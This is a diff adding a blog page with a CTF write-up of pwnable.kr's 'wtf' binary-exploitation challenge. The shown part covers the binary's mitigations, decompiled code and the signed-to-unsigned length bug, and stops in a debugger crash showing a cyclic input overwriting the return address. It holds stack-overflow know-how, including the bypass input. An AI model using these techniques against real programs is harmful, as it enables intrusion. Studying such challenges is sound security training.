@@ -1,0 +1,804 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes, viewport-fit=cover">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <title>wtf - pwnable.kr - gracecondition</title>
+    <meta name="description" content="OS internals, binary exploitation, and low-level security research">
+    <meta name="author" content="gracecondition">
+    <meta name="keywords" content="security research, binary exploitation, OS internals, vulnerability analysis, reverse engineering">
+
+    
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="http://localhost:1313/ctf/pwnable.kr/wtf-writeup/">
+    <meta property="og:title" content="wtf - pwnable.kr">
+    <meta property="og:description" content="Writeup of the pwnable wtf CTF Challenge">
+    
+    <meta property="og:image" content="https://pwnable.kr/img/wtf.png">
+    
+    
+    <meta property="article:published_time" content="2025-12-22T10:30:00Z">
+    <meta property="article:modified_time" content="2025-12-22T10:30:00Z">
+    
+
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="http://localhost:1313/ctf/pwnable.kr/wtf-writeup/">
+    <meta name="twitter:title" content="wtf - pwnable.kr">
+    <meta name="twitter:description" content="Writeup of the pwnable wtf CTF Challenge">
+    
+    <meta name="twitter:image" content="https://pwnable.kr/img/wtf.png">
+    
+
+    
+    <link rel="canonical" href="http://localhost:1313/ctf/pwnable.kr/wtf-writeup/">
+
+    
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        
+        "headline": "wtf - pwnable.kr",
+        "description": "Writeup of the pwnable wtf CTF Challenge",
+        "author": {
+            "@type": "Person",
+            "name": "gracecondition"
+        },
+        "datePublished": "2025-12-22T10:30:00Z",
+        "dateModified": "2025-12-22T10:30:00Z",
+        
+        "image": "https:\/\/pwnable.kr\/img\/wtf.png",
+        
+        "publisher": {
+            "@type": "Organization",
+            "name": "gracecondition",
+            "url": "http:\/\/localhost:1313\/"
+        },
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/ctf\/pwnable.kr\/wtf-writeup\/"
+        }
+        
+    }
+    </script>
+
+    <link rel="stylesheet" href="http://localhost:1313/css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;500;600;700&family=SF+Pro+Text:wght@300;400;500;600&display=swap" rel="stylesheet">
+
+    
+    <link rel="icon" href="http://localhost:1313/favicon.png">
+    
+
+    
+</head>
+<body>
+    <canvas id="wave-gradient-canvas"></canvas>
+    <div class="site-container">
+        <header class="site-header">
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="http://localhost:1313/" class="nav-brand">
+                <h1>gracecondition</h1>
+            </a>
+
+            <div class="nav-menu" id="nav-menu">
+                <a href="http://localhost:1313/" class="nav-link">Home</a>
+                <a href="/posts/" class="nav-link">Posts</a>
+                <a href="/ctf/" class="nav-link">CTF Solutions</a>
+                <a href="/about/" class="nav-link">About</a>
+            </div>
+
+            <div class="nav-toggle" id="nav-toggle">
+                <span class="bar"></span>
+                <span class="bar"></span>
+                <span class="bar"></span>
+            </div>
+        </div>
+    </nav>
+</header>
+
+        <main class="main-content">
+            
+<div class="content-with-toc">
+    <aside class="toc-sidebar">
+    <div class="toc-content">
+        
+        <div class="toc-section">
+            <h3 class="toc-title">📖 Contents</h3>
+            <nav class="toc-nav" id="toc-nav">
+                
+                
+                <nav id="TableOfContents">
+  <ul>
+    <li><a href="#wtf---writeup">WTF - writeup</a>
+      <ul>
+        <li><a href="#challenge-description">Challenge description</a></li>
+        <li><a href="#understanding-the-challenge">Understanding the challenge</a>
+          <ul>
+            <li><a href="#enabled-mitigations">Enabled mitigations</a></li>
+            <li><a href="#reverse-engineering--triage">Reverse engineering &amp; triage</a>
+              <ul>
+                <li><a href="#loading-in-ida">Loading In IDA</a></li>
+              </ul>
+            </li>
+            <li><a href="#no-we-cant-getting-stuck">No we cant! (getting stuck)</a></li>
+            <li><a href="#what-is-a-piped-buffer">What is a piped buffer</a></li>
+            <li><a href="#why-the-exploit-conditions-change">Why the exploit conditions change</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#solution">Solution:</a></li>
+  </ul>
+</nav>
+                
+            </nav>
+        </div>
+
+        
+        <div class="toc-section">
+            <h4 class="toc-subtitle">Article Info</h4>
+            <div class="article-info">
+                <div class="info-item">
+                    <span class="info-label">Published:</span>
+                    <time class="info-value">Dec 22, 2025</time>
+                </div>
+                
+                <div class="info-item">
+                    <span class="info-label">Read time:</span>
+                    <span class="info-value">9 min</span>
+                </div>
+                
+                
+                <div class="info-item">
+                    <span class="info-label">Words:</span>
+                    <span class="info-value">1912</span>
+                </div>
+                
+                
+                <div class="info-item">
+                    <span class="info-label">Category:</span>
+                    <span class="info-value category-ctf">Ctf</span>
+                </div>
+                
+            </div>
+        </div>
+
+        
+        
+        <div class="toc-section">
+            <h4 class="toc-subtitle">Challenge Details</h4>
+            <div class="challenge-info">
+                <div class="info-item">
+                    <span class="info-label">Category:</span>
+                    <span class="info-value challenge-category category-pwn">PWN</span>
+                </div>
+                
+                <div class="info-item">
+                    <span class="info-label">Points:</span>
+                    <span class="info-value">120</span>
+                </div>
+                
+                
+                <div class="info-item">
+                    <span class="info-label">Solves:</span>
+                    <span class="info-value">51</span>
+                </div>
+                
+                
+                <div class="info-item">
+                    <span class="info-label">CTF:</span>
+                    <span class="info-value">pwnable.kr</span>
+                </div>
+                
+            </div>
+        </div>
+        
+
+        
+        
+        <div class="toc-section">
+            <h4 class="toc-subtitle">Tags</h4>
+            <div class="toc-tags">
+                
+                <a href="/tags/pwnable/" class="toc-tag">#pwnable</a>
+                
+                <a href="/tags/ctf/" class="toc-tag">#CTF</a>
+                
+                <a href="/tags/write-what-where/" class="toc-tag">#Write-What-Where</a>
+                
+            </div>
+        </div>
+        
+
+        
+        <div class="toc-section">
+            <h4 class="toc-subtitle">Progress</h4>
+            <div class="reading-progress-container">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progress-fill"></div>
+                </div>
+                <div class="progress-text">
+                    <span id="progress-percentage">0%</span>
+                    <span class="progress-label">completed</span>
+                </div>
+            </div>
+        </div>
+
+        
+        <div class="toc-section">
+            <h4 class="toc-subtitle">Related</h4>
+            <div class="related-posts">
+                
+                
+                <article class="related-post">
+                    <a href="http://localhost:1313/ctf/pwnable.kr/passcode/" class="related-post-link">
+                        <span class="related-post-icon">
+                            🚩
+                            
+                        </span>
+                        <div class="related-post-content">
+                            <h5 class="related-post-title">Passcode - pwnable.kr</h5>
+                            <time class="related-post-date">Nov 15</time>
+                        </div>
+                    </a>
+                </article>
+                
+            </div>
+        </div>
+
+    </div>
+</aside>
+
+    <article class="single-post ctf-writeup">
+        <header class="post-header ctf-header">
+            <div class="ctf-meta">
+                <span class="ctf-badge">🚩 CTF Writeup</span>
+                
+                <span class="ctf-name">pwnable.kr</span>
+                
+            </div>
+
+            <h1 class="post-title-single">wtf - pwnable.kr</h1>
+
+            <div class="ctf-challenge-info">
+                <div class="challenge-stats">
+                    
+                    <div class="stat-item">
+                        <span class="stat-label">Category:</span>
+                        <span class="stat-value category-pwn">PWN</span>
+                    </div>
+                    
+                    
+                    <div class="stat-item">
+                        <span class="stat-label">Points:</span>
+                        <span class="stat-value">120</span>
+                    </div>
+                    
+                    
+                    <div class="stat-item">
+                        <span class="stat-label">Solves:</span>
+                        <span class="stat-value">51</span>
+                    </div>
+                    
+                    
+                </div>
+                <div class="post-meta-single">
+                    <time datetime="2025-12-22">December 22, 2025</time>
+                    
+                    <span> • </span>
+                    <span>9 min read</span>
+                    
+                </div>
+            </div>
+        </header>
+
+        <div class="post-body ctf-content" id="post-content">
+            <h1 id="wtf---writeup">WTF - writeup</h1>
+<p>WTF is a relatively tricky challenge.
+It looks simple on the surface, but is actually challenging due to an interesting
+nuance.</p>
+<h2 id="challenge-description">Challenge description</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>I don&#39;t understand why my exploit is not working.
+</span></span><span style="display:flex;"><span>I need your help.
+</span></span></code></pre></div><h2 id="understanding-the-challenge">Understanding the challenge</h2>
+<h3 id="enabled-mitigations">Enabled mitigations</h3>
+<p>Analyzing this with my custom tool, <a href="https://github.com/gracecondition/elfsec">elfsec</a>, The following mitigations are enabled:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>╔═══════════════════════════════════════════════════════════════════╗
+</span></span><span style="display:flex;"><span>║                        elfsec v1.2.2                              ║
+</span></span><span style="display:flex;"><span>╠═══════════════════════════════════════════════════════════════════╣
+</span></span><span style="display:flex;"><span>║ RELRO               Partial RELRO                                 ║
+</span></span><span style="display:flex;"><span>║ CANARIES            No stack canaries found                       ║
+</span></span><span style="display:flex;"><span>║ NX                  NX enabled                                    ║
+</span></span><span style="display:flex;"><span>║ PIE                 No PIE                                        ║
+</span></span><span style="display:flex;"><span>║ RPATH               No RPATH                                      ║
+</span></span><span style="display:flex;"><span>║ RUNPATH             No RUNPATH                                    ║
+</span></span><span style="display:flex;"><span>║ FORTIFY             No FORTIFY                                    ║
+</span></span><span style="display:flex;"><span>║ UBSan               No UBSan                                      ║
+</span></span><span style="display:flex;"><span>║ ASAN                No ASAN                                       ║
+</span></span><span style="display:flex;"><span>║ CFI                 No CFI                                        ║
+</span></span><span style="display:flex;"><span>║ CET                 No CET                                        ║
+</span></span><span style="display:flex;"><span>║ SYMBOLS             Not stripped <span style="color:#f92672">(</span><span style="color:#ae81ff">69</span> symbols<span style="color:#f92672">)</span>                     ║
+</span></span><span style="display:flex;"><span>║ STACK CLASH         No stack clash protection                     ║
+</span></span><span style="display:flex;"><span>║ HEAP COOKIES        No heap hardening                             ║
+</span></span><span style="display:flex;"><span>║ INT OVERFLOW        No integer overflow protection                ║
+</span></span><span style="display:flex;"><span>║ SECCOMP             No SECCOMP                                    ║
+</span></span><span style="display:flex;"><span>╚═══════════════════════════════════════════════════════════════════╝
+</span></span></code></pre></div><p>The fact that we dont have:</p>
+<ul>
+<li>stack canaries</li>
+<li>PIE</li>
+</ul>
+<p>Is  a strong indicator to us from the challenge maker that we need to buffer overflow with a predetermined address.</p>
+<h3 id="reverse-engineering--triage">Reverse engineering &amp; triage</h3>
+<p>We can inspect the function names in pwndbg:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Reading symbols from wtf<span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>(No debugging symbols found <span style="color:#f92672">in</span> wtf)
+</span></span><span style="display:flex;"><span>dpwndbg: loaded <span style="color:#ae81ff">190</span> pwndbg commands<span style="color:#f92672">.</span> Type pwndbg [filter] <span style="color:#66d9ef">for</span> a list<span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span>pwndbg: created <span style="color:#ae81ff">13</span> GDB functions (can be used with print<span style="color:#f92672">/</span><span style="color:#66d9ef">break</span>)<span style="color:#f92672">.</span> Type help function to see them<span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-------</span> tip of the day (disable with set show<span style="color:#f92672">-</span>tips off) <span style="color:#f92672">-------</span>
+</span></span><span style="display:flex;"><span>If you want Pwndbg to clear screen on each command (but still save previous output <span style="color:#f92672">in</span> history) use set context<span style="color:#f92672">-</span>clear<span style="color:#f92672">-</span>screen on
+</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> info functions  
+</span></span><span style="display:flex;"><span>All defined functions:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Non<span style="color:#f92672">-</span>debugging symbols:
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400490</span>  _init
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004004c0</span>  puts<span style="color:#960050;background-color:#1e0010">@</span>plt
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004004d0</span>  system<span style="color:#960050;background-color:#1e0010">@</span>plt
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004004e0</span>  read<span style="color:#960050;background-color:#1e0010">@</span>plt
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004004f0</span>  __libc_start_main<span style="color:#960050;background-color:#1e0010">@</span>plt
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400500</span>  __isoc99_scanf<span style="color:#960050;background-color:#1e0010">@</span>plt
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400510</span>  _start
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040053c</span>  call_gmon_start
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400560</span>  __do_global_dtors_aux
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005d0</span>  frame_dummy
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005f4</span>  win
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400604</span>  my_fgets
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400669</span>  main
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006d0</span>  __libc_csu_init
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400760</span>  __libc_csu_fini
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400770</span>  __do_global_ctors_aux
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004007a8</span>  _fini
+</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> exit
+</span></span></code></pre></div><p>Or better yet, using <code>nm</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0000000000600e50 d _DYNAMIC
+</span></span><span style="display:flex;"><span>0000000000600fe8 d _GLOBAL_OFFSET_TABLE_
+</span></span><span style="display:flex;"><span>00000000004007b8 R _IO_stdin_used
+</span></span><span style="display:flex;"><span>                 w _Jv_RegisterClasses
+</span></span><span style="display:flex;"><span>0000000000600e30 d __CTOR_END__
+</span></span><span style="display:flex;"><span>0000000000600e28 d __CTOR_LIST__
+</span></span><span style="display:flex;"><span>0000000000600e40 D __DTOR_END__
+</span></span><span style="display:flex;"><span>0000000000600e38 d __DTOR_LIST__
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000000400908</span> r __FRAME_END__
+</span></span><span style="display:flex;"><span>0000000000600e48 d __JCR_END__
+</span></span><span style="display:flex;"><span>0000000000600e48 d __JCR_LIST__
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000000601038</span> A __bss_start
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000000601028</span> D __data_start
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000000400770</span> t __do_global_ctors_aux
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000000400560</span> t __do_global_dtors_aux
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000000601030</span> D __dso_handle
+</span></span><span style="display:flex;"><span>                 w __gmon_start__
+</span></span><span style="display:flex;"><span>0000000000600e24 d __init_array_end
+</span></span><span style="display:flex;"><span>0000000000600e24 d __init_array_start
+</span></span><span style="display:flex;"><span>                 U __isoc99_scanf@@GLIBC_2.7
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000000400760</span> T __libc_csu_fini
+</span></span><span style="display:flex;"><span>00000000004006d0 T __libc_csu_init
+</span></span><span style="display:flex;"><span>                 U __libc_start_main@@GLIBC_2.2.5
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000000601038</span> A _edata
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000000601048</span> A _end
+</span></span><span style="display:flex;"><span>00000000004007a8 T _fini
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000000400490</span> T _init
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000000400510</span> T _start
+</span></span><span style="display:flex;"><span>000000000040053c t call_gmon_start
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000000601038</span> b completed.6531
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000000601028</span> W data_start
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000000601040</span> b dtor_idx.6533
+</span></span><span style="display:flex;"><span>00000000004005d0 t frame_dummy
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000000400669</span> T main
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000000400604</span> T my_fgets
+</span></span><span style="display:flex;"><span>                 U puts@@GLIBC_2.2.5
+</span></span><span style="display:flex;"><span>                 U read@@GLIBC_2.2.5
+</span></span><span style="display:flex;"><span>                 U system@@GLIBC_2.2.5
+</span></span><span style="display:flex;"><span>00000000004005f4 T win
+</span></span></code></pre></div><p>Which will just give us more info, out of the box.</p>
+<h4 id="loading-in-ida">Loading In IDA</h4>
+<p>After loading this binary in IDA, I landed in the following <code>main()</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> input[<span style="color:#ae81ff">44</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-30h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> count; <span style="color:#75715e">// [rsp+3Ch] [rbp-4h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>count);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( count <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">32</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;preventing buffer overflow&#34;</span>);
+</span></span><span style="display:flex;"><span>    count <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">my_fgets</span>(input, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)count);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The most interesting thing that immediately jumps out to me is <code>my_fgets()</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">my_fgets</span>(<span style="color:#66d9ef">__int64</span> input, <span style="color:#66d9ef">int</span> count)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf; <span style="color:#75715e">// [rsp+1Bh] [rbp-5h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+1Ch] [rbp-4h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; count<span style="color:#f92672">--</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>; <span style="color:#f92672">++</span>i )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">1u</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( buf <span style="color:#f92672">==</span> <span style="color:#ae81ff">10</span> )
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(_BYTE <span style="color:#f92672">*</span>)(input <span style="color:#f92672">+</span> (<span style="color:#66d9ef">int</span>)i) <span style="color:#f92672">=</span> buf;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> i;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Looking at this function, it looks like it will just call <code>read()</code>, to read the data from stdin.</p>
+<p>What immediately jumped out to me is that its using signed integers to do sanity checks.
+If we supply for example, <code>-1</code> to int count, during the <code> if ( count &gt; 32 )</code> check, it will be checked
+as a signed integer, meaning that count being a negative number, will never be greater than 32.</p>
+<p>However, this probably wouldn&rsquo;t be a problem on its own. If  <code>my_fgets</code> was written properly, it would probably refuse
+to read -1 bytes and would just terminate. (Or would always just be an unsigned integer to avoid this class of bug)</p>
+<p>Even worse,</p>
+<p>We have a type confusion bug on line 30 of <code>main()</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#a6e22e">my_fgets</span>(input, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)count);
+</span></span></code></pre></div><p><code>count</code> gets recast as an unsigned int for some reason, ballooning the amount of data
+<code>my_fgets</code> reads. The number becomes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0xffffffff</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">294</span>,<span style="color:#ae81ff">967</span>,<span style="color:#ae81ff">295</span>
+</span></span></code></pre></div><p>In years, that&rsquo;s about how old earth is, or half the age of the universe</p>
+<p>(fun fact 🙂)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> run
+</span></span><span style="display:flex;"><span>Starting program: <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>malicious<span style="color:#f92672">/</span>hethet<span style="color:#f92672">/</span>pwnable<span style="color:#f92672">/</span>wtf<span style="color:#f92672">/</span>wtf 
+</span></span><span style="display:flex;"><span>warning: Unable to find libthread_db matching inferior<span style="color:#e6db74">&#39;s thread library, thread debugging will not be available.</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Program received <span style="color:#66d9ef">signal</span> SIGSEGV, Segmentation fault<span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x616161706161616f</span> <span style="color:#f92672">in</span> <span style="color:#960050;background-color:#1e0010">??</span> ()
+</span></span><span style="display:flex;"><span>LEGEND: STACK <span style="color:#f92672">|</span> HEAP <span style="color:#f92672">|</span> CODE <span style="color:#f92672">|</span> DATA <span style="color:#f92672">|</span> WX <span style="color:#f92672">|</span> RODATA
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>[ REGISTERS <span style="color:#f92672">/</span> show<span style="color:#f92672">-</span>flags off <span style="color:#f92672">/</span> show<span style="color:#f92672">-</span>compact<span style="color:#f92672">-</span>regs off ]<span style="color:#960050;background-color:#1e0010">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+</span></span><span style="display:flex;"><span> RAX  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> RBX  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> RCX  <span style="color:#ae81ff">0x40</span>
+</span></span><span style="display:flex;"><span> RDX  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> RDI  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> RSI  <span style="color:#ae81ff">0x7fffffffe7bb</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0xffe810000000800a</span>
+</span></span><span style="display:flex;"><span> R8   <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> R9   <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> R10  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> R11  <span style="color:#ae81ff">0x202</span>
+</span></span><span style="display:flex;"><span> R12  <span style="color:#ae81ff">0x7fffffffe938</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7fffffffebc0</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#e6db74">&#39;/home/malicious/hethet/pwnable/wtf/wtf&#39;</span>
+</span></span><span style="display:flex;"><span> R13  <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span> R14  <span style="color:#ae81ff">0x7ffff7ffd000</span> (_rtld_global) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffff7ffe2f0</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> R15  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> RBP  <span style="color:#ae81ff">0x6161616e6161616d</span> (<span style="color:#e6db74">&#39;maaanaaa&#39;</span>)
+</span></span><span style="display:flex;"><span> RSP  <span style="color:#ae81ff">0x7fffffffe820</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#e6db74">&#39;qaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab&#39;</span>
+</span></span><span style="display:flex;"><span> RIP  <span style="color:#ae81ff">0x616161706161616f</span> (<span style="color:#e6db74">&#39;oaaapaaa&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>[ DISASM <span style="color:#f92672">/</span> x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span> <span style="color:#f92672">/</span> set emulate on ]<span style="color:#960050;background-color:#1e0010">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+</span></span><span style="display:flex;"><span>Invalid address <span style="color:#ae81ff">0x616161706161616f</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>[ STACK ]<span style="color:#960050;background-color:#1e0010">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">0000</span><span style="color:#960050;background-color:#1e0010">│</span> rsp <span style="color:#ae81ff">0x7fffffffe820</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#e6db74">&#39;qaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab&#39;</span>
